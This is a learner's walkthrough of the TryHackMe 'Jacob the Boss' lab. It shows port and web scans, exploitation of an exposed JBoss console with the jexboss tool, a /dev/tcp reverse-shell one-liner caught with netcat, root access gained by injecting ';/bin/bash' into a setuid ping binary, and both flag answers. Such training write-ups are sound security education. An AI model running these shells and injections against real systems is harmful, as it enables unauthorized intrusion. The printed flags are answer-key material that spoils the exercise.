<h1 align="center">Jacob the Boss</h1>
<p align="center">2025, August 8<br> Hey there, fellow lifelong learner! I´m <a href="https://www.linkedin.com/in/rosanafssantos/">Rosana</a>, and I’m excited to join you on this adventure, part of my <code>459</code>-day-streak in <a href="https://tryhackme.com">TryHackMe</a>.<br>
<em>Find a way in and learn a little more.</em>.<br>
<img width="80px" src="https://github.com/user-attachments/assets/8a157d7c-b065-489b-8b21-f309d36061d4"><br>
Access this walkthrough room clicking <a href="https://tryhackme.com/room/jacobtheboss">here </a>.<br>
<img width="1200px" src="https://github.com/user-attachments/assets/9df59db5-c1fb-4708-97ae-07a5862af3ae"></p>


<br>


<h2>Task 1 . GO on, it´s your machine!</h2>
<p>Well, the flaw that makes up this box is the reproduction found in the production environment of a customer a while ago, the verification in season consisted of two steps, the last one within the environment, we hit it head-on and more than 15 machines were vulnerable that together with the development team we were able to correct and adapt.<br>

*First of all, add the jacobtheboss.box address to your hosts file.<br>

Anyway, learn a little more, have fun!</p>



<p><em>Answer the questions below</em></p>

<br>

<h3>Nmap</h3>

```bash
:~/JacobTheBoss# nmap -sT TargetIP
...
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
111/tcp  open  rpcbind
1090/tcp open  ff-fms
1098/tcp open  rmiactivation
1099/tcp open  rmiregistry
3306/tcp open  mysql
4444/tcp open  krb524
4445/tcp open  upnotifyp
4446/tcp open  n1-fwp
8009/tcp open  ajp13
8080/tcp open  http-proxy
8083/tcp open  us-srv
```

<br>

```bash
:~/JacobTheBoss# nmap -sC -sV -Pn TargetIP
...
PORT     STATE SERVICE     VERSION
22/tcp   open  ssh         OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey: 
|   2048 82:ca:13:6e:d9:63:c0:5f:4a:23:a5:a5:a5:10:3c:7f (RSA)
|   256 a4:6e:d2:5d:0d:36:2e:73:2f:1d:52:9c:e5:8a:7b:04 (ECDSA)
|_  256 6f:54:a6:5e:ba:5b:ad:cc:87:ee:d3:a8:d5:e0:aa:2a (ED25519)
80/tcp   open  http        Apache httpd 2.4.6 ((CentOS) PHP/7.3.20)
|_http-server-header: Apache/2.4.6 (CentOS) PHP/7.3.20
|_http-title: My first blog
111/tcp  open  rpcbind     2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|_  100000  3,4          111/udp6  rpcbind
1090/tcp open  java-rmi    Java RMI
|_rmi-dumpregistry: ERROR: Script execution failed (use -d to debug)
1098/tcp open  java-rmi    Java RMI
1099/tcp open  java-object Java Object Serialization
| fingerprint-strings: 
|   NULL: 
|     java.rmi.MarshalledObject|
|     hash[
|     locBytest
|     objBytesq
|     http://jacobtheboss.box:8083/q
|     org.jnp.server.NamingServer_Stub
|     java.rmi.server.RemoteStub
|     java.rmi.server.RemoteObject
|     xpw;
|     UnicastRef2
|_    jacobtheboss.box
3306/tcp open  mysql       MariaDB (unauthorized)
4444/tcp open  java-rmi    Java RMI
4445/tcp open  java-object Java Object Serialization
4446/tcp open  java-object Java Object Serialization
8009/tcp open  ajp13       Apache Jserv (Protocol v1.3)
| ajp-methods: 
|   Supported methods: GET HEAD POST PUT DELETE TRACE OPTIONS
|   Potentially risky methods: PUT DELETE TRACE
|_  See https://nmap.org/nsedoc/scripts/ajp-methods.html
8080/tcp open  http        Apache Tomcat/Coyote JSP engine 1.1
| http-methods: 
|_  Potentially risky methods: PUT DELETE TRACE
|_http-open-proxy: Proxy might be redirecting requests
|_http-server-header: Apache-Coyote/1.1
|_http-title: Welcome to JBoss&trade;
8083/tcp open  http        JBoss service httpd
|_http-title: Site doesn't have a title (text/html).
```


<br>
<h3>Nikto</h3>


```bash
:~/JacobTheBoss# nikto -h jacobtheboss.box
- Nikto v2.1.5
---------------------------------------------------------------------------
+ Target IP:          TargetIP
+ Target Hostname:    jacobtheboss.box
+ Target Port:        80
+ Start Time:         2025-08-08 xx:xx:xx (GMT1)
---------------------------------------------------------------------------
+ Server: Apache/2.4.6 (CentOS) PHP/7.3.20
+ Retrieved x-powered-by header: PHP/7.3.20
+ Server leaks inodes via ETags, header found with file /, fields: 0x0b2872b0cfaa1649d61ab0adfb5a81fc 
+ The anti-clickjacking X-Frame-Options header is not present.
+ DEBUG HTTP verb may show server debugging information. See http://msdn.microsoft.com/en-us/library/e8z01xdh%28VS.80%29.aspx for details.
+ OSVDB-877: HTTP TRACE method is active, suggesting the host is vulnerable to XST
+ OSVDB-3268: /public/: Directory indexing found.
+ OSVDB-3092: /public/: This might be interesting...
+ Uncommon header 'x-frame-options' found, with contents: SAMEORIGIN
+ OSVDB-3093: /admin/auth.php: This might be interesting... has been seen in web logs from an unknown scanner.
+ OSVDB-3268: /icons/: Directory indexing found.
+ OSVDB-3233: /icons/README: Apache default file found.
+ 6544 items checked: 0 error(s) and 11 item(s) reported on remote host
+ End Time:           2025-08-08 xx:xx:xx (GMT1) (20 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
```

<br>
<h3>Dirsearch</h3>

```bash
:~/JacobTheBoss# dirsearch -u http://jacobtheboss.box/ -x 403
...
[00:44:01] Starting: 
[00:44:14] 301 -  227B  - /admin  ->  http://jacobtheboss.box/admin/
[00:44:15] 302 -    0B  - /admin/  ->  http://jacobtheboss.box/admin/auth.php
[00:44:16] 302 -    0B  - /admin/index.php  ->  http://jacobtheboss.box/admin/auth.php
[00:44:31] 200 -   46KB - /CHANGELOG
[00:44:34] 200 -  427B  - /CONTRIBUTING.md
[00:44:34] 200 -  817B  - /CREDITS
[00:44:51] 200 -   18KB - /LICENSE
[00:45:08] 301 -  228B  - /public  ->  http://jacobtheboss.box/public/
[00:45:08] 200 -  675B  - /public/
[00:45:09] 200 -    4KB - /README.md
[00:45:22] 200 -    2KB - /themes/
[00:45:22] 301 -  228B  - /themes  ->  http://jacobtheboss.box/themes/

Task Completed
```


<img width="1019" height="547" alt="image" src="https://github.com/user-attachments/assets/0bf121cb-fbe6-4bd2-9590-f452b69c55ea" />

<img width="733" height="397" alt="image" src="https://github.com/user-attachments/assets/4ce2661a-1716-4ae1-93ce-cbdc4b8f0e89" />

<img width="1018" height="630" alt="image" src="https://github.com/user-attachments/assets/95dff5b2-51b0-41ed-963f-010b437dd60c" />

<br>
<h3>jexboss</h3>

```bash
:~/JacobTheBoss# git clone https://github.com/joaomatosf/jexboss.git
:~/JacobTheBoss#cd jexboss
:~/JacobTheBoss/jexboss# pip3 install -r requires.txt
:~/JacobTheBoss/jexboss# python3 jexboss.py -host http://TargetIP:8080


* Checking for updates in: http://joaomatosf.com/rnp/releases.txt **


 ** Checking Host: http://TargetIP:8080 **

 [*] Checking admin-console:                  [ OK ]
 [*] Checking Struts2:                        [ OK ]
 [*] Checking Servlet Deserialization:        [ OK ]
 [*] Checking Application Deserialization:    [ OK ]
 [*] Checking Jenkins:                        [ OK ]
 [*] Checking web-console:                    [ VULNERABLE ]
 [*] Checking jmx-console:                    [ VULNERABLE ]
 [*] Checking JMXInvokerServlet:              [ VULNERABLE ]


 * Do you want to try to run an automated exploitation via "web-console" ?
   If successful, this operation will provide a simple command shell to execute 
   commands on the server..
   Continue only if you have permission!
   yes/NO? yes

* Sending exploit code to http://TargetIP:8080. Please wait...

 * Successfully deployed code! Starting command shell. Please wait...

# ----------------------------------------- # LOL # ----------------------------------------- #

 * http://TargetIP:8080: 

# ----------------------------------------- #

 * For a Reverse Shell (like meterpreter =]), type the command: 

   jexremote=YOUR_IP:YOUR_PORT

   Example:
     Shell>jexremote=192.168.0.10:4444

   Or use other techniques of your choice, like:
     Shell>/bin/bash -i > /dev/tcp/192.168.0.10/4444 0>&1 2>&1
   
   And so on... =]

# ----------------------------------------- #

...
Shell> /bin/bash -i > /dev/tcp/TargetIP/4444 0>&1 2>&1
```

<img width="601" height="82" alt="image" src="https://github.com/user-attachments/assets/428b3736-ef17-453f-8893-c827da1b262d" />

<br>

<img width="585" height="139" alt="image" src="https://github.com/user-attachments/assets/ebef30e7-d0c9-47fe-bd8a-b436d8df0c5b" />

```bash
:~/JacobTheBoss# nc -nlvp 4444
Listening on 0.0.0.0 4444
Connection received on TargetIP 50640
bash: no job control in this shell
[jacob@jacobtheboss /]$ whoami
whoami
jacob
[jacob@jacobtheboss /]$ pwd
pwd
/
[jacob@jacobtheboss /]$ cat /home/jacob/user.txt
cat /home/jacob/user.txt
f4d491f280de360cc49e26ca1587cbcc
```

<br>

<p>1.1. user.txt?<br>
<code>f4d491f280de360cc49e26ca1587cbcc</code></p>

<br>

```bash
[jacob@jacobtheboss /]$ find / -type f -user root -perm -u=s 2>/dev/null
find / -type f -user root -perm -u=s 2>/dev/null
/usr/bin/pingsys
/usr/bin/fusermount
/usr/bin/gpasswd
/usr/bin/su
/usr/bin/chfn
/usr/bin/newgrp
/usr/bin/chsh
/usr/bin/sudo
/usr/bin/mount
/usr/bin/chage
/usr/bin/umount
/usr/bin/crontab
/usr/bin/pkexec
/usr/bin/passwd
/usr/sbin/pam_timestamp_check
/usr/sbin/unix_chkpwd
/usr/sbin/usernetctl
/usr/sbin/mount.nfs
/usr/lib/polkit-1/polkit-agent-helper-1
/usr/libexec/dbus-1/dbus-daemon-launch-helper
```


```bash
[jacob@jacobtheboss /]$ /usr/bin/pingsys "TargetIP;id"
/usr/bin/pingsys "TargetIP;id"
PING TargetIP (TargetIP) 56(84) bytes of data.
64 bytes from TargetIP: icmp_seq=1 ttl=64 time=0.022 ms
64 bytes from TargetIP: icmp_seq=2 ttl=64 time=0.033 ms
64 bytes from TargetIP: icmp_seq=3 ttl=64 time=0.034 ms
64 bytes from TargetIP: icmp_seq=4 ttl=64 time=0.034 ms

--- 10.201.78.196 ping statistics ---
4 packets transmitted, 4 received, 0% packet loss, time 2999ms
rtt min/avg/max/mdev = 0.022/0.030/0.034/0.008 ms
uid=0(root) gid=1001(jacob) groups=1001(jacob) context=system_u:system_r:initrc_t:s0
```


```bash
[jacob@jacobtheboss /]$ /usr/bin/pingsys "TargetIP;/bin/bash"
/usr/bin/pingsys "TargetIP;/bin/bash"
PING TargetIP (TargetIP) 56(84) bytes of data.
64 bytes from TargetIP: icmp_seq=1 ttl=64 time=0.017 ms
64 bytes from TargetIP: icmp_seq=2 ttl=64 time=0.035 ms
64 bytes from TagetIP: icmp_seq=3 ttl=64 time=0.034 ms
64 bytes from TargetIP: icmp_seq=4 ttl=64 time=0.031 ms

--- TargetIP ping statistics ---
4 packets transmitted, 4 received, 0% packet loss, time 2999ms
rtt min/avg/max/mdev = 0.017/0.029/0.035/0.008 ms
```

<br>


```bash
whoami
root
ls -lah /root
total 60K
dr-xr-x---.  4 root root  252 Jul 31  2020 .
dr-xr-xr-x. 17 root root  240 Jul 30  2020 ..
-rw-------.  1 root root 5.5K Jun  1  2019 anaconda-ks.cfg
-rw-------.  1 root root   17 Jul 31  2020 .bash_history
-rw-r--r--.  1 root root   18 Dec 29  2013 .bash_logout
-rw-r--r--.  1 root root  176 Dec 29  2013 .bash_profile
-rw-r--r--.  1 root root  176 Dec 29  2013 .bashrc
-rw-r--r--.  1 root root  100 Dec 29  2013 .cshrc
-rwx------.  1 root root   72 Jul 31  2020 jboss.sh
-rw-------.  1 root root    1 Jul 31  2020 .mysql_history
-rw-------.  1 root root 5.2K Jun  1  2019 original-ks.cfg
drwxr-----.  3 root root   19 Jul 31  2020 .pki
-rw-------.  1 root root   33 Jul 31  2020 root.txt
drwx------.  2 root root   29 Jul 30  2020 .ssh
-rw-r--r--.  1 root root  129 Dec 29  2013 .tcshrc
-rw-------.  1 root root 4.8K Jul 31  2020 .viminfo
ls /root 
anaconda-ks.cfg
jboss.sh
original-ks.cfg
root.txt
cat /root/root.txt
29a5641eaa0c01abe5749608c8232806
```

<br>

<p>1.2. root.txt?<br>
<code>29a5641eaa0c01abe5749608c8232806</code></p>


<img width="1161" height="548" alt="image" src="https://github.com/user-attachments/assets/43031567-e384-4eb8-8c24-d170299670bc" />

<br>
<br>

<h1 align="center">Completed</h1>
<p align="center"><img width="1200px" src="https://github.com/user-attachments/assets/212a44a8-8434-47c6-b048-2d67505c71a5"><br>
                  <img width="1200px" src="https://github.com/user-attachments/assets/f0c6df2b-6368-4bd7-9521-e18a965c8f1d"></p>


<br>

<h1 align="center">My TryHackMe Journey</h1>

<div align="center">

| Date              | Streak   | All Time     | All Time     | Monthly     | Monthly    | Points   | Rooms     | Badges    |
| :---------------: | :------: | :----------: | :----------: | :---------: | :--------: | :------  | :-------: | :-------: |
|                   |          |    Global    |    Brazil    |    Global   |   Brazil   |          | Completed |           |
| 2025, August 8    |   459    |     131ˢᵗ    |      5ᵗʰ     |     736ᵗʰ   |    15ᵗʰ    | 119,618  |    903    |    73     |


</div>

<p align="center">Global All Time:   131ˢᵗ<br><img width="250px" src="https://github.com/user-attachments/assets/d5727931-df5f-47b9-a0b7-96b24c36c7e4"><br>
                                              <img width="1200px" src="https://github.com/user-attachments/assets/396bf15a-42ea-4be3-941a-237c6f431e23"><br><br>
                  Brazil All Time:     5ᵗʰ<br><img width="1200px" src="https://github.com/user-attachments/assets/c1bceff6-7bc9-4ae3-8ad3-4ca56b557fea"><br>
                  Global monthly:    736ᵗʰ<br><img width="1200px" src="https://github.com/user-attachments/assets/f878aebb-0c6f-43cf-a9a4-f580505de9d0"><br>
                  Brazil monthly:     15ᵗʰ<br><img width="1200px" src="https://github.com/user-attachments/assets/83fa7ec8-4006-48fd-9a44-76bb29273d10"><br>

<br>
<h1 align="center">Thanks for Coming!</h1>
<p align="center">Follow me on <a href="https://medium.com/@RosanaFS">Medium</a>, here on <a href="https://github.com/RosanaFSS/TryHackMe">GitHub</a>, and on <a href="https://www.linkedin.com/in/rosanafssantos/">LinkedIN</a>.</p> 
